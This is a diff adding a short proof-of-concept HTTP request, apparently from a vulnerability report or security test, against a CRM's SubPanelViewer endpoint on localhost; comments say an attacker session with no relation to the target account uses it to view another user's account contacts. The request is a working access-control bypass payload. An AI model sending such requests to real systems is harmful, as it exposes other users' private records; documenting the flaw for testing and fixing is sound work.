@@ -1,0 +1,7 @@
+GET /index.php?module=Accounts&action=SubPanelViewer&record=72e4a438-0f5b-4929-9815-165f5d1bd9bd&subpanel=contacts&inline=1&ajaxSubpanel=true HTTP/1.1
+Host: localhost:33116
+Cookie: PHPSESSID=<attacker-session>
+User-Agent: <browser>
+
+# Attacker A (mod_265f2830) has never viewed, been assigned,
+# or been related to Account 72e4a438-0f5b-4929-9815-165f5d1bd9bd or Contact 20f10308-a737-4d20-b6ab-27f450f4a86f (both owned by V).
